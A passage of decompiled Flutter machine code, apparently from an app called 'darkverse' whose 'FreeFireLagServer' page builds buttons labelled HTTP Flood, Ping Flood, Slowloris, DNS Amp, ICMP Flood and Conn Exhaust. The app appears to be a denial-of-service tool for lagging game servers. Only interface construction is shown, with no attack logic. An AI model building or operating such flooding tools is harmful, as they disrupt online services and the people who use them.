    //     0x876a14: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876a18: mov             x1, x0
    // 0x876a1c: r0 = Instance_ColorSpace
    //     0x876a1c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876a20: StoreField: r1->field_27 = r0
    //     0x876a20: stur            w0, [x1, #0x27]
    // 0x876a24: d0 = 0.760784
    //     0x876a24: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876a28: ldr             d0, [x17, #0xc40]
    // 0x876a2c: StoreField: r1->field_7 = d0
    //     0x876a2c: stur            d0, [x1, #7]
    // 0x876a30: d1 = 0.956863
    //     0x876a30: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876a34: ldr             d1, [x17, #0xec8]
    // 0x876a38: StoreField: r1->field_f = d1
    //     0x876a38: stur            d1, [x1, #0xf]
    // 0x876a3c: ArrayStore: r1[0] = d1  ; List_8
    //     0x876a3c: stur            d1, [x1, #0x17]
    // 0x876a40: StoreField: r1->field_1f = d1
    //     0x876a40: stur            d1, [x1, #0x1f]
    // 0x876a44: mov             x3, x1
    // 0x876a48: ldur            x1, [fp, #-0x18]
    // 0x876a4c: r2 = "HTTP Flood"
    //     0x876a4c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdc8] "HTTP Flood"
    //     0x876a50: ldr             x2, [x2, #0xdc8]
    // 0x876a54: r0 = _buildChip()
    //     0x876a54: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876a58: mov             x1, x0
    // 0x876a5c: ldur            x0, [fp, #-8]
    // 0x876a60: stur            x1, [fp, #-0x48]
    // 0x876a64: LoadField: r2 = r0->field_f
    //     0x876a64: ldur            w2, [x0, #0xf]
    // 0x876a68: DecompressPointer r2
    //     0x876a68: add             x2, x2, HEAP, lsl #32
    // 0x876a6c: stur            x2, [fp, #-0x18]
    // 0x876a70: r0 = Color()
    //     0x876a70: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876a74: mov             x1, x0
    // 0x876a78: r0 = Instance_ColorSpace
    //     0x876a78: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876a7c: StoreField: r1->field_27 = r0
    //     0x876a7c: stur            w0, [x1, #0x27]
    // 0x876a80: d0 = 0.760784
    //     0x876a80: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876a84: ldr             d0, [x17, #0xc40]
    // 0x876a88: StoreField: r1->field_7 = d0
    //     0x876a88: stur            d0, [x1, #7]
    // 0x876a8c: d1 = 0.956863
    //     0x876a8c: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876a90: ldr             d1, [x17, #0xec8]
    // 0x876a94: StoreField: r1->field_f = d1
    //     0x876a94: stur            d1, [x1, #0xf]
    // 0x876a98: ArrayStore: r1[0] = d1  ; List_8
    //     0x876a98: stur            d1, [x1, #0x17]
    // 0x876a9c: StoreField: r1->field_1f = d1
    //     0x876a9c: stur            d1, [x1, #0x1f]
    // 0x876aa0: mov             x3, x1
    // 0x876aa4: ldur            x1, [fp, #-0x18]
    // 0x876aa8: r2 = "Ping Flood"
    //     0x876aa8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdd0] "Ping Flood"
    //     0x876aac: ldr             x2, [x2, #0xdd0]
    // 0x876ab0: r0 = _buildChip()
    //     0x876ab0: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876ab4: mov             x1, x0
    // 0x876ab8: ldur            x0, [fp, #-8]
    // 0x876abc: stur            x1, [fp, #-0x50]
    // 0x876ac0: LoadField: r2 = r0->field_f
    //     0x876ac0: ldur            w2, [x0, #0xf]
    // 0x876ac4: DecompressPointer r2
    //     0x876ac4: add             x2, x2, HEAP, lsl #32
    // 0x876ac8: stur            x2, [fp, #-0x18]
    // 0x876acc: r0 = Color()
    //     0x876acc: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876ad0: mov             x1, x0
    // 0x876ad4: r0 = Instance_ColorSpace
    //     0x876ad4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876ad8: StoreField: r1->field_27 = r0
    //     0x876ad8: stur            w0, [x1, #0x27]
    // 0x876adc: d0 = 0.760784
    //     0x876adc: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876ae0: ldr             d0, [x17, #0xc40]
    // 0x876ae4: StoreField: r1->field_7 = d0
    //     0x876ae4: stur            d0, [x1, #7]
    // 0x876ae8: d1 = 0.956863
    //     0x876ae8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876aec: ldr             d1, [x17, #0xec8]
    // 0x876af0: StoreField: r1->field_f = d1
    //     0x876af0: stur            d1, [x1, #0xf]
    // 0x876af4: ArrayStore: r1[0] = d1  ; List_8
    //     0x876af4: stur            d1, [x1, #0x17]
    // 0x876af8: StoreField: r1->field_1f = d1
    //     0x876af8: stur            d1, [x1, #0x1f]
    // 0x876afc: mov             x3, x1
    // 0x876b00: ldur            x1, [fp, #-0x18]
    // 0x876b04: r2 = "Slowloris"
    //     0x876b04: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdd8] "Slowloris"
    //     0x876b08: ldr             x2, [x2, #0xdd8]
    // 0x876b0c: r0 = _buildChip()
    //     0x876b0c: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876b10: mov             x1, x0
    // 0x876b14: ldur            x0, [fp, #-8]
    // 0x876b18: stur            x1, [fp, #-0x58]
    // 0x876b1c: LoadField: r2 = r0->field_f
    //     0x876b1c: ldur            w2, [x0, #0xf]
    // 0x876b20: DecompressPointer r2
    //     0x876b20: add             x2, x2, HEAP, lsl #32
    // 0x876b24: stur            x2, [fp, #-0x18]
    // 0x876b28: r0 = Color()
    //     0x876b28: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876b2c: mov             x1, x0
    // 0x876b30: r0 = Instance_ColorSpace
    //     0x876b30: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876b34: StoreField: r1->field_27 = r0
    //     0x876b34: stur            w0, [x1, #0x27]
    // 0x876b38: d0 = 0.760784
    //     0x876b38: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876b3c: ldr             d0, [x17, #0xc40]
    // 0x876b40: StoreField: r1->field_7 = d0
    //     0x876b40: stur            d0, [x1, #7]
    // 0x876b44: d1 = 0.956863
    //     0x876b44: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876b48: ldr             d1, [x17, #0xec8]
    // 0x876b4c: StoreField: r1->field_f = d1
    //     0x876b4c: stur            d1, [x1, #0xf]
    // 0x876b50: ArrayStore: r1[0] = d1  ; List_8
    //     0x876b50: stur            d1, [x1, #0x17]
    // 0x876b54: StoreField: r1->field_1f = d1
    //     0x876b54: stur            d1, [x1, #0x1f]
    // 0x876b58: mov             x3, x1
    // 0x876b5c: ldur            x1, [fp, #-0x18]
    // 0x876b60: r2 = "DNS Amp"
    //     0x876b60: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bde0] "DNS Amp"
    //     0x876b64: ldr             x2, [x2, #0xde0]
    // 0x876b68: r0 = _buildChip()
    //     0x876b68: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876b6c: mov             x1, x0
    // 0x876b70: ldur            x0, [fp, #-8]
    // 0x876b74: stur            x1, [fp, #-0x60]
    // 0x876b78: LoadField: r2 = r0->field_f
    //     0x876b78: ldur            w2, [x0, #0xf]
    // 0x876b7c: DecompressPointer r2
    //     0x876b7c: add             x2, x2, HEAP, lsl #32
    // 0x876b80: stur            x2, [fp, #-0x18]
    // 0x876b84: r0 = Color()
    //     0x876b84: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876b88: mov             x1, x0
    // 0x876b8c: r0 = Instance_ColorSpace
    //     0x876b8c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876b90: StoreField: r1->field_27 = r0
    //     0x876b90: stur            w0, [x1, #0x27]
    // 0x876b94: d0 = 0.760784
    //     0x876b94: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876b98: ldr             d0, [x17, #0xc40]
    // 0x876b9c: StoreField: r1->field_7 = d0
    //     0x876b9c: stur            d0, [x1, #7]
    // 0x876ba0: d1 = 0.956863
    //     0x876ba0: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876ba4: ldr             d1, [x17, #0xec8]
    // 0x876ba8: StoreField: r1->field_f = d1
    //     0x876ba8: stur            d1, [x1, #0xf]
    // 0x876bac: ArrayStore: r1[0] = d1  ; List_8
    //     0x876bac: stur            d1, [x1, #0x17]
    // 0x876bb0: StoreField: r1->field_1f = d1
    //     0x876bb0: stur            d1, [x1, #0x1f]
    // 0x876bb4: mov             x3, x1
    // 0x876bb8: ldur            x1, [fp, #-0x18]
    // 0x876bbc: r2 = "ICMP Flood"
    //     0x876bbc: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bde8] "ICMP Flood"
    //     0x876bc0: ldr             x2, [x2, #0xde8]
    // 0x876bc4: r0 = _buildChip()
    //     0x876bc4: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876bc8: mov             x1, x0
    // 0x876bcc: ldur            x0, [fp, #-8]
    // 0x876bd0: stur            x1, [fp, #-0x68]
    // 0x876bd4: LoadField: r2 = r0->field_f
    //     0x876bd4: ldur            w2, [x0, #0xf]
    // 0x876bd8: DecompressPointer r2
    //     0x876bd8: add             x2, x2, HEAP, lsl #32
    // 0x876bdc: stur            x2, [fp, #-0x18]
    // 0x876be0: r0 = Color()
    //     0x876be0: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876be4: mov             x1, x0
    // 0x876be8: r0 = Instance_ColorSpace
    //     0x876be8: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876bec: StoreField: r1->field_27 = r0
    //     0x876bec: stur            w0, [x1, #0x27]
    // 0x876bf0: d0 = 0.760784
    //     0x876bf0: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876bf4: ldr             d0, [x17, #0xc40]
    // 0x876bf8: StoreField: r1->field_7 = d0
    //     0x876bf8: stur            d0, [x1, #7]
    // 0x876bfc: d1 = 0.956863
    //     0x876bfc: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876c00: ldr             d1, [x17, #0xec8]
    // 0x876c04: StoreField: r1->field_f = d1
    //     0x876c04: stur            d1, [x1, #0xf]
    // 0x876c08: ArrayStore: r1[0] = d1  ; List_8
    //     0x876c08: stur            d1, [x1, #0x17]
    // 0x876c0c: StoreField: r1->field_1f = d1
    //     0x876c0c: stur            d1, [x1, #0x1f]
    // 0x876c10: mov             x3, x1
    // 0x876c14: ldur            x1, [fp, #-0x18]
    // 0x876c18: r2 = "Conn Exhaust"
    //     0x876c18: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdf0] "Conn Exhaust"
    //     0x876c1c: ldr             x2, [x2, #0xdf0]
    // 0x876c20: r0 = _buildChip()
    //     0x876c20: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x876c24: r1 = Null
    //     0x876c24: mov             x1, NULL
    // 0x876c28: r2 = 16
    //     0x876c28: mov             x2, #0x10
    // 0x876c2c: stur            x0, [fp, #-8]
    // 0x876c30: r0 = AllocateArray()
    //     0x876c30: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x876c34: mov             x2, x0
    // 0x876c38: ldur            x0, [fp, #-0x30]
    // 0x876c3c: stur            x2, [fp, #-0x18]
    // 0x876c40: StoreField: r2->field_f = r0
    //     0x876c40: stur            w0, [x2, #0xf]
    // 0x876c44: ldur            x0, [fp, #-0x38]
    // 0x876c48: StoreField: r2->field_13 = r0
    //     0x876c48: stur            w0, [x2, #0x13]
    // 0x876c4c: ldur            x0, [fp, #-0x48]
    // 0x876c50: ArrayStore: r2[0] = r0  ; List_4
    //     0x876c50: stur            w0, [x2, #0x17]
    // 0x876c54: ldur            x0, [fp, #-0x50]
    // 0x876c58: StoreField: r2->field_1b = r0
    //     0x876c58: stur            w0, [x2, #0x1b]
    // 0x876c5c: ldur            x0, [fp, #-0x58]
    // 0x876c60: StoreField: r2->field_1f = r0
    //     0x876c60: stur            w0, [x2, #0x1f]
    // 0x876c64: ldur            x0, [fp, #-0x60]
    // 0x876c68: StoreField: r2->field_23 = r0
    //     0x876c68: stur            w0, [x2, #0x23]
    // 0x876c6c: ldur            x0, [fp, #-0x68]
    // 0x876c70: StoreField: r2->field_27 = r0
    //     0x876c70: stur            w0, [x2, #0x27]
    // 0x876c74: ldur            x0, [fp, #-8]
    // 0x876c78: StoreField: r2->field_2b = r0
    //     0x876c78: stur            w0, [x2, #0x2b]
    // 0x876c7c: r1 = <Widget>
    //     0x876c7c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x876c80: r0 = AllocateGrowableArray()
    //     0x876c80: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x876c84: mov             x1, x0
    // 0x876c88: ldur            x0, [fp, #-0x18]
    // 0x876c8c: stur            x1, [fp, #-8]
    // 0x876c90: StoreField: r1->field_f = r0
    //     0x876c90: stur            w0, [x1, #0xf]
    // 0x876c94: r2 = 16
    //     0x876c94: mov             x2, #0x10
    // 0x876c98: StoreField: r1->field_b = r2
    //     0x876c98: stur            w2, [x1, #0xb]
    // 0x876c9c: r0 = Wrap()
    //     0x876c9c: bl              #0x794c24  ; AllocateWrapStub -> Wrap (size=0x3c)
    // 0x876ca0: mov             x3, x0
    // 0x876ca4: r0 = Instance_Axis
    //     0x876ca4: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x876ca8: stur            x3, [fp, #-0x18]
    // 0x876cac: StoreField: r3->field_f = r0
    //     0x876cac: stur            w0, [x3, #0xf]
    // 0x876cb0: r1 = Instance_WrapAlignment
    //     0x876cb0: add             x1, PP, #0x1a, lsl #12  ; [pp+0x1afd8] Obj!WrapAlignment@a3ff41
    //     0x876cb4: ldr             x1, [x1, #0xfd8]
    // 0x876cb8: StoreField: r3->field_13 = r1
    //     0x876cb8: stur            w1, [x3, #0x13]
    // 0x876cbc: d0 = 8.000000
    //     0x876cbc: fmov            d0, #8.00000000
    // 0x876cc0: ArrayStore: r3[0] = d0  ; List_8
    //     0x876cc0: stur            d0, [x3, #0x17]
    // 0x876cc4: StoreField: r3->field_1f = r1
    //     0x876cc4: stur            w1, [x3, #0x1f]
    // 0x876cc8: StoreField: r3->field_23 = d0
    //     0x876cc8: stur            d0, [x3, #0x23]
    // 0x876ccc: r1 = Instance_WrapCrossAlignment
    //     0x876ccc: add             x1, PP, #0x1a, lsl #12  ; [pp+0x1afe0] Obj!WrapCrossAlignment@a3fe81
    //     0x876cd0: ldr             x1, [x1, #0xfe0]
    // 0x876cd4: StoreField: r3->field_2b = r1
    //     0x876cd4: stur            w1, [x3, #0x2b]
    // 0x876cd8: r4 = Instance_VerticalDirection
    //     0x876cd8: ldr             x4, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x876cdc: StoreField: r3->field_33 = r4
    //     0x876cdc: stur            w4, [x3, #0x33]
    // 0x876ce0: r5 = Instance_Clip
    //     0x876ce0: ldr             x5, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876ce4: StoreField: r3->field_37 = r5
    //     0x876ce4: stur            w5, [x3, #0x37]
    // 0x876ce8: ldur            x1, [fp, #-8]
    // 0x876cec: StoreField: r3->field_b = r1
    //     0x876cec: stur            w1, [x3, #0xb]
    // 0x876cf0: r1 = Null
    //     0x876cf0: mov             x1, NULL
    // 0x876cf4: r2 = 6
    //     0x876cf4: mov             x2, #6
    // 0x876cf8: r0 = AllocateArray()
    //     0x876cf8: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x876cfc: stur            x0, [fp, #-8]
    // 0x876d00: r16 = Instance_Text
    //     0x876d00: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bdf8] Obj!Text@a30191
    //     0x876d04: ldr             x16, [x16, #0xdf8]
    // 0x876d08: StoreField: r0->field_f = r16
    //     0x876d08: stur            w16, [x0, #0xf]
    // 0x876d0c: r16 = Instance_SizedBox
    //     0x876d0c: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x876d10: ldr             x16, [x16, #0x50]
    // 0x876d14: StoreField: r0->field_13 = r16
    //     0x876d14: stur            w16, [x0, #0x13]
    // 0x876d18: ldur            x1, [fp, #-0x18]
    // 0x876d1c: ArrayStore: r0[0] = r1  ; List_4
    //     0x876d1c: stur            w1, [x0, #0x17]
    // 0x876d20: r1 = <Widget>
    //     0x876d20: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x876d24: r0 = AllocateGrowableArray()
    //     0x876d24: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x876d28: mov             x1, x0
    // 0x876d2c: ldur            x0, [fp, #-8]
    // 0x876d30: stur            x1, [fp, #-0x18]
    // 0x876d34: StoreField: r1->field_f = r0
    //     0x876d34: stur            w0, [x1, #0xf]
    // 0x876d38: r2 = 6
    //     0x876d38: mov             x2, #6
    // 0x876d3c: StoreField: r1->field_b = r2
    //     0x876d3c: stur            w2, [x1, #0xb]
    // 0x876d40: r0 = Column()
    //     0x876d40: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x876d44: mov             x1, x0
    // 0x876d48: r0 = Instance_Axis
    //     0x876d48: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x876d4c: stur            x1, [fp, #-8]
    // 0x876d50: StoreField: r1->field_f = r0
    //     0x876d50: stur            w0, [x1, #0xf]
    // 0x876d54: r2 = Instance_MainAxisAlignment
    //     0x876d54: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x876d58: StoreField: r1->field_13 = r2
    //     0x876d58: stur            w2, [x1, #0x13]
    // 0x876d5c: r3 = Instance_MainAxisSize
    //     0x876d5c: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x876d60: ldr             x3, [x3, #0xbc0]
    // 0x876d64: ArrayStore: r1[0] = r3  ; List_4
    //     0x876d64: stur            w3, [x1, #0x17]
    // 0x876d68: r4 = Instance_CrossAxisAlignment
    //     0x876d68: add             x4, PP, #0xa, lsl #12  ; [pp+0xada0] Obj!CrossAxisAlignment@a402e1
    //     0x876d6c: ldr             x4, [x4, #0xda0]
    // 0x876d70: StoreField: r1->field_1b = r4
    //     0x876d70: stur            w4, [x1, #0x1b]
    // 0x876d74: r4 = Instance_VerticalDirection
    //     0x876d74: ldr             x4, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x876d78: StoreField: r1->field_23 = r4
    //     0x876d78: stur            w4, [x1, #0x23]
    // 0x876d7c: r5 = Instance_Clip
    //     0x876d7c: ldr             x5, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876d80: StoreField: r1->field_2b = r5
    //     0x876d80: stur            w5, [x1, #0x2b]
    // 0x876d84: StoreField: r1->field_2f = rZR
    //     0x876d84: stur            xzr, [x1, #0x2f]
    // 0x876d88: ldur            x6, [fp, #-0x18]
    // 0x876d8c: StoreField: r1->field_b = r6
    //     0x876d8c: stur            w6, [x1, #0xb]
    // 0x876d90: r0 = Container()
    //     0x876d90: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x876d94: stur            x0, [fp, #-0x18]
    // 0x876d98: r16 = Instance_EdgeInsets
    //     0x876d98: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3b3b8] Obj!EdgeInsets@a08991
    //     0x876d9c: ldr             x16, [x16, #0x3b8]
    // 0x876da0: ldur            lr, [fp, #-0x40]
    // 0x876da4: stp             lr, x16, [SP, #8]
    // 0x876da8: ldur            x16, [fp, #-8]
    // 0x876dac: str             x16, [SP]
    // 0x876db0: mov             x1, x0
    // 0x876db4: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x876db4: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x876db8: ldr             x4, [x4, #0xe58]
    // 0x876dbc: r0 = Container()
    //     0x876dbc: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x876dc0: r0 = GlassBlur()
    //     0x876dc0: bl              #0x6bce18  ; AllocateGlassBlurStub -> GlassBlur (size=0x20)
    // 0x876dc4: d0 = 15.000000
    //     0x876dc4: fmov            d0, #15.00000000
    // 0x876dc8: stur            x0, [fp, #-8]
    // 0x876dcc: StoreField: r0->field_b = d0
    //     0x876dcc: stur            d0, [x0, #0xb]
    // 0x876dd0: ldur            x1, [fp, #-0x18]
    // 0x876dd4: StoreField: r0->field_1b = r1
    //     0x876dd4: stur            w1, [x0, #0x1b]
    // 0x876dd8: d1 = 10.000000
    //     0x876dd8: fmov            d1, #10.00000000
    // 0x876ddc: StoreField: r0->field_13 = d1
    //     0x876ddc: stur            d1, [x0, #0x13]
    // 0x876de0: r1 = LoadStaticField(0xd6c)
    //     0x876de0: ldr             x1, [THR, #0x78]  ; THR::field_table_values
    //     0x876de4: ldr             x1, [x1, #0x1ad8]
    // 0x876de8: tbnz            w1, #4, #0x876df4
    // 0x876dec: r5 = Null
    //     0x876dec: mov             x5, NULL
    // 0x876df0: b               #0x876e08
    // 0x876df4: ldur            x2, [fp, #-0x10]
    // 0x876df8: r1 = Function '<anonymous closure>':.
    //     0x876df8: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be00] AnonymousClosure: (0x8780e8), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::build (0x876058)
    //     0x876dfc: ldr             x1, [x1, #0xe00]
    // 0x876e00: r0 = AllocateClosure()
    //     0x876e00: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x876e04: mov             x5, x0
    // 0x876e08: stur            x5, [fp, #-0x18]
    // 0x876e0c: r0 = Color()
    //     0x876e0c: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876e10: mov             x1, x0
    // 0x876e14: r0 = Instance_ColorSpace
    //     0x876e14: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876e18: stur            x1, [fp, #-0x30]
    // 0x876e1c: StoreField: r1->field_27 = r0
    //     0x876e1c: stur            w0, [x1, #0x27]
    // 0x876e20: d0 = 0.149020
    //     0x876e20: add             x17, PP, #0x13, lsl #12  ; [pp+0x13e60] IMM: double(0.14901960784313725) from 0x3fc3131313131313
    //     0x876e24: ldr             d0, [x17, #0xe60]
    // 0x876e28: StoreField: r1->field_7 = d0
    //     0x876e28: stur            d0, [x1, #7]
    // 0x876e2c: d0 = 0.992157
    //     0x876e2c: ldr             d0, [PP, #0x6f38]  ; [pp+0x6f38] IMM: double(0.9921568627450981) from 0x3fefbfbfbfbfbfc0
    // 0x876e30: StoreField: r1->field_f = d0
    //     0x876e30: stur            d0, [x1, #0xf]
    // 0x876e34: d0 = 0.619608
    //     0x876e34: ldr             d0, [PP, #0x6f40]  ; [pp+0x6f40] IMM: double(0.6196078431372549) from 0x3fe3d3d3d3d3d3d4
    // 0x876e38: ArrayStore: r1[0] = d0  ; List_8
    //     0x876e38: stur            d0, [x1, #0x17]
    // 0x876e3c: StoreField: r1->field_1f = d0
    //     0x876e3c: stur            d0, [x1, #0x1f]
    // 0x876e40: r0 = Radius()
    //     0x876e40: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x876e44: d0 = 12.000000
    //     0x876e44: fmov            d0, #12.00000000
    // 0x876e48: stur            x0, [fp, #-0x38]
    // 0x876e4c: StoreField: r0->field_7 = d0
    //     0x876e4c: stur            d0, [x0, #7]
    // 0x876e50: StoreField: r0->field_f = d0
    //     0x876e50: stur            d0, [x0, #0xf]
    // 0x876e54: r0 = BorderRadius()
    //     0x876e54: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x876e58: mov             x1, x0
    // 0x876e5c: ldur            x0, [fp, #-0x38]
    // 0x876e60: stur            x1, [fp, #-0x40]
    // 0x876e64: StoreField: r1->field_7 = r0
    //     0x876e64: stur            w0, [x1, #7]
    // 0x876e68: StoreField: r1->field_b = r0
    //     0x876e68: stur            w0, [x1, #0xb]
    // 0x876e6c: StoreField: r1->field_f = r0
    //     0x876e6c: stur            w0, [x1, #0xf]
    // 0x876e70: StoreField: r1->field_13 = r0
    //     0x876e70: stur            w0, [x1, #0x13]
    // 0x876e74: r0 = RoundedRectangleBorder()
    //     0x876e74: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x876e78: mov             x1, x0
    // 0x876e7c: ldur            x0, [fp, #-0x40]
    // 0x876e80: StoreField: r1->field_b = r0
    //     0x876e80: stur            w0, [x1, #0xb]
    // 0x876e84: r0 = Instance_BorderSide
    //     0x876e84: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd70] Obj!BorderSide@a28af1
    //     0x876e88: ldr             x0, [x0, #0xd70]
    // 0x876e8c: StoreField: r1->field_7 = r0
    //     0x876e8c: stur            w0, [x1, #7]
    // 0x876e90: r16 = Instance_EdgeInsets
    //     0x876e90: add             x16, PP, #0x26, lsl #12  ; [pp+0x26420] Obj!EdgeInsets@a071f1
    //     0x876e94: ldr             x16, [x16, #0x420]
    // 0x876e98: stp             x1, x16, [SP]
    // 0x876e9c: ldur            x1, [fp, #-0x30]
    // 0x876ea0: r4 = const [0, 0x3, 0x2, 0x1, padding, 0x1, shape, 0x2, null]
    //     0x876ea0: add             x4, PP, #0x37, lsl #12  ; [pp+0x37cc0] List(9) [0, 0x3, 0x2, 0x1, "padding", 0x1, "shape", 0x2, Null]
    //     0x876ea4: ldr             x4, [x4, #0xcc0]
    // 0x876ea8: r0 = styleFrom()
    //     0x876ea8: bl              #0x6a6e2c  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::styleFrom
    // 0x876eac: stur            x0, [fp, #-0x30]
    // 0x876eb0: r0 = ElevatedButton()
    //     0x876eb0: bl              #0x6b0714  ; AllocateElevatedButtonStub -> ElevatedButton (size=0x40)
    // 0x876eb4: mov             x1, x0
    // 0x876eb8: ldur            x5, [fp, #-0x18]
    // 0x876ebc: ldur            x6, [fp, #-0x30]
    // 0x876ec0: r2 = Instance_Icon
    //     0x876ec0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be08] Obj!Icon@a367a1
    //     0x876ec4: ldr             x2, [x2, #0xe08]
    // 0x876ec8: r3 = Instance_Text
    //     0x876ec8: add             x3, PP, #0x3b, lsl #12  ; [pp+0x3be10] Obj!Text@a300f1
    //     0x876ecc: ldr             x3, [x3, #0xe10]
    // 0x876ed0: stur            x0, [fp, #-0x18]
    // 0x876ed4: r0 = ElevatedButton.icon()
    //     0x876ed4: bl              #0x6b83a8  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::ElevatedButton.icon
    // 0x876ed8: r1 = <FlexParentData>
    //     0x876ed8: add             x1, PP, #0x11, lsl #12  ; [pp+0x11550] TypeArguments: <FlexParentData>
    //     0x876edc: ldr             x1, [x1, #0x550]
    // 0x876ee0: r0 = Expanded()
    //     0x876ee0: bl              #0x6b0720  ; AllocateExpandedStub -> Expanded (size=0x20)
    // 0x876ee4: mov             x3, x0
    // 0x876ee8: r0 = 1
    //     0x876ee8: mov             x0, #1
    // 0x876eec: stur            x3, [fp, #-0x30]
    // 0x876ef0: StoreField: r3->field_13 = r0
    //     0x876ef0: stur            x0, [x3, #0x13]
    // 0x876ef4: r4 = Instance_FlexFit
    //     0x876ef4: add             x4, PP, #0xc, lsl #12  ; [pp+0xcbe0] Obj!FlexFit@a40421
    //     0x876ef8: ldr             x4, [x4, #0xbe0]
    // 0x876efc: StoreField: r3->field_1b = r4
    //     0x876efc: stur            w4, [x3, #0x1b]
    // 0x876f00: ldur            x1, [fp, #-0x18]
